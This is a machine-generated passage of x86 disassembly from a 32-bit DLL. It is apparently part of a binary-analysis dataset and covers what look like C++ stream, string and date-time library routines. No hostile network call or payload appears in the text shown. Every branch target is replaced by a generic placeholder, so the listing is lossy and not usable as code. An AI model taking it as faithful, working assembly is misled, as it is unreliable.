push 0x1
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x30
call sub_10009633
mov ecx [ ebp + 0xc ]
push 0x1
mov esi eax
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x4 ] 0x2c
call sub_10009633
push 0xfffffffc
pop ecx
sub ecx esi
add eax ecx
mov ecx [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_10009533
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_1000926b
push 0x24
mov eax sub_10052759
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_10007e90
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100063b1
pop ecx
lea ecx [ ebp - 0x1c ]
mov edi eax
call sub_10007dbd
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx esi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ edi ]
mov [ ebp - 0x20 ] ecx
movzx ecx [ ebp + 0xc ]
push ecx
push [ ebp - 0x20 ]
add eax esi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_100081bf
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_10009301
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_1000935d
push 0x1c
mov eax sub_1005272c
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007e90
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100063b1
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10007dbd
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx esi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ edi ]
push ecx
add eax esi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call [ ebx + 0x18 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100081bf
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_100093ec
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009448
push 0x1c
mov eax sub_100526ff
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007e90
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x1c ] bl
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100063b1
pop ecx
lea ecx [ ebp - 0x18 ]
mov edi eax
call sub_10007dbd
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx esi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x28 ] bl
movzx ecx [ ecx + 0x30 ]
mov ebx [ edi ]
push ecx
add eax esi
push eax
push edx
push [ ebp - 0x28 ]
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
call [ ebx + 0x4 ]
xor ebx ebx
cmp [ ebp - 0x28 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn 0x8
push ebx
push [ ebp - 0x14 ]
call sub_100081bf
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
sub_100094d7
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009533
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0xb ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10009609
mov eax [ ebp + 0x8 ]
leave
retn 0xc
sub_1000957d
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
retn
call sub_10027827
sub_100095a5
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x10 ]
jb r-xdata
xor eax eax
add [ esi + 0x4 ] 0x8
mov eax esi
retn
call sub_10027827
sub_100095d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
lea eax [ esp + 0x4 ]
push esi
push eax
call sub_1002930b
pop ecx
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0xc ]
push eax
call sub_1000aec4
push [ ebp + 0x8 ]
mov esi eax
call sub_10009785
mov eax [ ebp + 0x8 ]
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
sub_10009609
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002630
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000253c
mov eax esi
pop esi
retn 0x10
sub_10009633
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ecx + 0x14 ]
push ebx
push esi
push edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov ecx [ ecx + 0x14 ]
mov eax [ ebp + 0xc ]
cmp eax ecx
jb r-xdata
or eax 0xffffffff
sub eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx eax
jb r-xdata
pop ebp
retn 0xc
mov eax ecx
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov [ ebp + 0xc ] eax
lea esi [ ecx + 0x4 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push edi
call sub_10006e4f
add esp 0xc
test eax eax
je r-xdata
lea edi [ eax + edx * 2 ]
mov eax [ ebp + 0x8 ]
movzx ebx [ eax ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x8
jb r-xdata
dec edi
dec edi
jmp r-xdata
cmp edi eax
je r-xdata
mov eax edi
sub eax esi
sar eax 0x1
jmp r-xdata
mov esi [ esi ]
cmp [ edi ] bx
jne r-xdata
pop edi
pop esi
pop ebx
sub_100096c4
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
mov esi edi
mov ebx eax
call sub_1000ab39
test al al
jne r-xdata
mov eax [ ebx ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ edi ]
mov [ esp + 0x18 ] eax
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x24 ]
lea ebx [ esp + 0x1c ]
call sub_1000a964
push [ eax + 0x4 ]
push [ eax ]
call sub_1000aa85
pop ecx
pop ecx
mov ecx eax
mov eax [ ebp + 0x8 ]
call sub_1000aacb
mov eax [ ebp + 0x8 ]
mov esi ebx
call sub_1000ab39
test al al
jne r-xdata
mov edx [ ebx ]
mov eax [ edi ]
mov ecx [ edi + 0x4 ]
mov ebx [ ebx + 0x4 ]
sub eax edx
sbb ecx ebx
push ecx
push eax
push 0x0
xor ecx ecx
xor eax eax
call sub_1000a880
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
add esp 0xc
mov [ ecx + 0x4 ] edx
mov eax ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10009785
push ebp
mov ebp esp
movzx eax [ esi + 0xc ]
sub esp 0x14
xor edx edx
inc edx
push ecx
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0x1f
ja r-xdata
call sub_1000a47c
mov [ ecx ] ax
mov ax [ esi + 0x10 ]
inc ax
xor edx edx
inc edx
push ecx
movzx eax ax
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x2
jge r-xdata
cmp ax 0xc
ja r-xdata
call sub_1000a405
mov [ ecx ] ax
mov eax 0x76c
add ax [ esi + 0x14 ]
push ecx
movzx eax ax
mov edx 0x578
mov ecx esp
mov [ ecx ] dx
movzx edx ax
inc edx
cmp edx 0x579
jge r-xdata
mov edx 0x2710
cmp ax dx
ja r-xdata
call sub_1000a172
mov [ ecx ] ax
lea eax [ ebp - 0x8 ]
push eax
call sub_1000a769
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x8 ]
push 0x0
push 0x0
push [ esi ]
call sub_1000a880
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
add esp 0xc
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
call sub_10009ed5
mov eax [ ebp + 0x8 ]
leave
retn
sub_10009849
cmp eax [ esp + 0x4 ]
je r-xdata
retn 0x4
push esi
lea esi [ eax + 0x4 ]
add esi 0x8
lea eax [ esi - 0x4 ]
cmp eax [ esp + 0x8 ]
jne r-xdata
call sub_1000af0a
mov ecx [ esi ]
test ecx ecx
je r-xdata
pop esi
sub_1000986e
and [ esi ] 0x0
test edi edi
je r-xdata
call sub_10027827
cmp [ edi + 0xc ] ebx
ja r-xdata
cmp ebx [ edi + 0x10 ]
jbe r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov eax esi
retn
sub_1000988e
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push [ ebp + 0x8 ]
mov ebx ecx
call sub_10009c44
pop ecx
mov eax ebx
pop ebx
leave
retn
sub_100098a8
push 0x20
mov eax sub_100514d6
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100025cf
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_100070e4
mov ecx [ ebp + 0x8 ]
push eax
call sub_100025cf
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_100098f3
push 0x20
mov eax sub_100514d6
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100025cf
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov ecx eax
call sub_10009e03
mov ecx [ ebp + 0x8 ]
push eax
call sub_100025cf
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_1000993a
push 0x14
mov eax sub_100526d2
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x18 ] ebx
call sub_1002762d
mov edi eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
cmp eax ebx
pop ecx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_10007e90
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
cmp eax edi
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax edi
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x28 ]
mov eax [ ecx ]
push edi
push [ ebp + 0xc ]
call [ eax + 0x20 ]
cmp eax edi
je r-xdata
test ebx ebx
jle r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
test ebx ebx
jle r-xdata
mov [ ebp - 0x18 ] 0x4
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x20 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn
push 0x0
push [ ebp - 0x18 ]
call sub_100081bf
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
dec ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub_10009a60
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009a93
push 0x20
mov eax sub_100526ad
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
mov eax r--data
xor edi edi
push eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] edi
call sub_10027160
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x18 ]
cmp eax edi
pop ecx
jle r-xdata
mov [ ebp - 0x18 ] edi
cmp eax ebx
jle r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_10007dd5
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10007a4d
pop ecx
lea ecx [ ebp - 0x20 ]
mov edi eax
mov [ ebp - 0x4 ] 0x1
call sub_10007dbd
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_10009c18
sub eax ebx
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push eax
call sub_10007e90
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
and [ eax + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
jmp sub_10009c18
test ebx ebx
jle r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
mov eax [ ebp - 0x1c ]
mov al [ eax ]
mov [ ebp - 0x24 ] al
push [ ebp - 0x24 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + esi + 0x28 ]
movzx eax ax
push eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
movzx edx [ eax + 0x30 ]
mov eax [ eax + 0x28 ]
push edx
mov ecx eax
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
dec ebx
inc [ ebp - 0x1c ]
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
dec [ ebp - 0x18 ]
jmp r-xdata
or [ ebp - 0x14 ] 0x4
sub_10009bea
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_100080a5
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
or ecx 0x4
sub_10009c18
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x14 ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x2c ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn
push 0x0
push [ ebp - 0x14 ]
call sub_100081bf
sub_10009c44
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x8 ] 0x0
push esi
mov esi eax
cmp [ esi + 0x18 ] 0x8
push edi
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
push esi
push eax
lea ecx [ ebp - 0xc ]
call sub_10007de8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx esi
call sub_10009d44
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
push 0x0
mov ecx ebx
mov [ ebp - 0x1c ] eax
mov [ ebx + 0x18 ] 0x7
call sub_10002630
push [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0xc
mov edi esp
lea esi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_10009cd4
pop edi
mov eax ebx
pop esi
leave
retn
sub_10009cd4
push 0x4
mov eax sub_100514b3
call sub_1002b2d9
and [ ebp - 0x4 ] 0x0
call sub_1002b37e
retn 0x20
lea ecx [ ebp + 0xc ]
call sub_10006f37
push [ ebp + 0x14 ]
movzx esi [ eax ]
call sub_10007a4d
mov edx [ eax ]
pop ecx
push esi
mov ecx eax
call [ edx + 0x20 ]
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push 0x1
call sub_10005db8
lea ecx [ ebp + 0xc ]
call sub_10006d3f
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10006d7a
test al al
jne r-xdata
sub_10009d64
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10001d48
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x8
jb r-xdata
call sub_10021cc4
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_100070e4
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_100024cd
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_10002614
add esp 0x10
push edi
mov ecx esi
call sub_10002630
sub_10009e20
push ecx
push esi
mov esi ebx
call sub_1000ab39
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx [ ebx + 0x4 ]
push 0xfffffffe
pop edx
cmp eax edx
jne r-xdata
mov eax [ esp + 0xc ]
mov esi [ eax ]
test esi esi
je r-xdata
mov esi [ esp + 0xc ]
mov esi [ esi ]
cmp esi edx
je r-xdata
cmp ecx 0x7fffffff
je r-xdata
cmp esi 0xffffffff
je r-xdata
mov [ edi ] edx
push ecx
push eax
call sub_1000aa6d
pop ecx
pop ecx
test al al
je r-xdata
cmp esi 0xfffffffe
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test esi esi
je r-xdata
xor eax eax
add esi [ ebx ]
adc eax [ ebx + 0x4 ]
mov [ edi ] esi
jmp r-xdata
mov eax ebx
call sub_1000ab16
test al al
je r-xdata
cmp [ ebx + 0x4 ] 0x80000000
jne r-xdata
mov [ edi ] 0xfffffffe
jmp r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
cmp esi 0xffffffff
jne r-xdata
mov [ edi + 0x4 ] 0x7fffffff
mov eax edi
pop esi
pop ecx
retn 0x4
test esi esi
jne r-xdata
or [ edi ] esi
jmp r-xdata
and [ edi ] esi
mov [ edi + 0x4 ] 0x80000000
jmp r-xdata
sub_10009ed5
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] 0x1
mov ebx [ eax ]
push edi
mov edi ecx
test ebx ebx
je r-xdata
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ebx
push eax
lea edi [ ebp - 0x14 ]
lea ebx [ ebp - 0xc ]
call sub_10009e20
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfffffffe
je r-xdata
mov esi edi
call sub_1000ab39
test al al
jne r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ edi ]
mov edi [ edi + 0x4 ]
push 0x14
push 0x1dd76000
push 0x0
push ebx
call sub_1002e310
mov ecx eax
mov eax [ ebp + 0x8 ]
add ecx esi
adc edx edi
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov esi eax
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
sub_10009f61
push 0x4
mov eax sub_100504ec
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000a113
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000ab7f
mov eax esi
call sub_1002b37e
retn
sub_10009fbb
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000a15a
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000a03c
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov esi ecx
push 0x40
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
add esi 0xffffffc4
push esi
call sub_1000a0c2
jmp r-xdata
xor eax eax
add eax 0x3c
jmp r-xdata
test eax eax
je r-xdata
call sub_1002b37e
retn
sub_1000a113
push 0x4
mov eax sub_1004ff23
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_1000a15a
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
je r-xdata
lea edi [ esi + 0x28 ]
push eax
mov ecx edi
call sub_1000ae26
mov [ esi ] r--data
mov [ edi ] r--data
mov eax esi
call sub_1002b37e
retn 0x4
lea eax [ edi + 0x28 ]
sub_1000a172
push 0xc4
mov eax sub_10051495
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push eax
lea ecx [ ebp - 0x38 ]
call sub_1000a72f
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x54 ]
call sub_100020e2
mov [ ebp - 0x38 ] r--data
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0xd0 ]
call sub_10009fbb
pop ecx
lea ecx [ ebp - 0x94 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x2
call sub_10009f61
lea eax [ ebp - 0x94 ]
mov [ esp ] r--data
push eax
call sub_1002ae74
int3
sub_1000a1e9
push 0x4
mov eax sub_100504be
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
push edi
mov ecx esi
call sub_1000a39b
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x1
lea ebx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ebx ] r--data
mov [ esi + 0x3c ] r--data
test edi edi
je r-xdata
xor edi edi
add edi 0x28
jmp r-xdata
call sub_1000ab7f
mov eax esi
call sub_1002b37e
retn
sub_1000a243
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1000a3e2
mov [ esi + 0x28 ] r--data
and [ esi + 0x2c ] 0x0
and [ esi + 0x30 ] 0x0
and [ esi + 0x34 ] 0x0
or [ esi + 0x38 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov eax esi
leave
retn
sub_1000a2c4
push 0x4
mov eax sub_100518f0
call sub_1002b2a6
mov esi ecx
push 0x40
